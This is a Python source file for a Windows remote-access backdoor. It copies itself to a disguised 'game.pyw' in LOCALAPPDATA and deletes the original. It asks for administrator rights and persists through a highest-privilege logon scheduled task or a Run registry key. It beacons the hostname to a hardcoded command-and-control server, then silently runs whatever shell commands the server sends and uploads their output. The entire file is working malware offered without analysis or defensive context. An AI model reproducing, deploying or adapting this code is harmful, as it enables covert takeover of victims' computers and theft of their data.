import ctypes, os, shutil, socket, subprocess, sys, time, winreg, requests
SITE = "https://cript-45cq.onrender.com"
TASK = "Remote Console"
TARGET = os.path.join(os.environ.get("LOCALAPPDATA") or "", "RemoteAdmin", "game.pyw")
RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
AUTH = ("xyrielly", "BRODONTHACKME1")
def pythonw():
    path = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    return path if os.path.isfile(path) else sys.executable
def quiet(argv):
    try:
        return subprocess.run(argv, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                              timeout=60, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0)).returncode
    except Exception:
        return -1
def admin():
    try:
        return os.name == "nt" and bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False
def task_exists():
    return quiet(["schtasks", "/Query", "/TN", TASK]) == 0
def create_task():
    return quiet(["schtasks", "/Create", "/TN", TASK, "/TR", f'"{pythonw()}" "{TARGET}"',
                  "/SC", "ONLOGON", "/RL", "HIGHEST", "/F"]) == 0
def tune_task():
    script = ("$ErrorActionPreference='Stop'; try { $n='" + TASK + "'; "
              "$s=(Get-ScheduledTask -TaskName $n).Settings; $s.DisallowStartIfOnBatteries=$false; "
              "$s.StopIfGoingOnBatteries=$false; $s.ExecutionTimeLimit='PT0S'; $s.StartWhenAvailable=$true; "
              "Set-ScheduledTask -TaskName $n -Settings $s | Out-Null } catch { exit 1 }")
    return quiet(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", script]) == 0
def startup_entry():
    ready = admin() and (create_task() or task_exists())
    if ready:
        tune_task()
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as key:
            if ready:
                try:
                    winreg.DeleteValue(key, TASK)
                except OSError:
                    pass
            else:
                winreg.SetValueEx(key, TASK, 0, winreg.REG_SZ, f'"{pythonw()}" "{TARGET}"')
    except OSError:
        pass
def elevate():
    if admin():
        return
    if task_exists() and quiet(["schtasks", "/Run", "/TN", TASK]) == 0:
        sys.exit()
    if ctypes.windll.shell32.ShellExecuteW(None, "runas", pythonw(), f'"{os.path.abspath(__file__)}"', None, 0) > 32:
        sys.exit()
def install():
    here = os.path.abspath(__file__)
    if here.lower() == TARGET.lower():
        return
    os.makedirs(os.path.dirname(TARGET), exist_ok=True)
    shutil.copy2(here, TARGET)
    try:
        os.remove(here)
    except OSError:
        pass
    os.execv(pythonw(), [pythonw(), TARGET])
def stop_others():
    subprocess.run(["powershell", "-NoProfile", "-Command",
                    "Get-CimInstance Win32_Process -Filter \"Name='pythonw.exe'\" | Where-Object { $_.CommandLine -like '*game.pyw*' -and $_.ProcessId -ne "
                    + str(os.getpid()) + " } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }"],
                   creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
def register():
    requests.post(SITE + "/sync", timeout=15, auth=AUTH, json={
        "name": socket.gethostname(), "computer_name": socket.gethostname(), "root": os.path.abspath(os.sep),
        "tree": {"name": socket.gethostname(), "path": "", "loaded": True, "dirs": [], "files": []},
    }).raise_for_status()
def main():
    install()
    elevate()
    startup_entry()
    stop_others()
    last_sync = 0
    while True:
        if time.time() - last_sync >= 20:
            register()
            last_sync = time.time()
        action = requests.get(SITE + "/next-action", timeout=10, auth=AUTH, params={"name": socket.gethostname()}).json()
        if action.get("action") == "console":
            try:
                process = subprocess.run(action.get("command") or "", shell=True, cwd=os.path.abspath(os.sep),
                                         stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                         timeout=120, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
                output, code = process.stdout.decode("utf-8", "replace"), process.returncode
            except Exception as error:
                output, code = f"Command failed: {error}", -1
            requests.post(SITE + "/upload-console", timeout=60, auth=AUTH, data={
                "command_id": action.get("command_id"), "name": socket.gethostname(),
                "output": output[:100000], "exit_code": code,
            }).raise_for_status()
        time.sleep(1)
if __name__ == "__main__":
    while True:
        try:
            main()
        except Exception:
            time.sleep(3)
            os.execv(sys.executable, [sys.executable, os.path.abspath(__file__)])
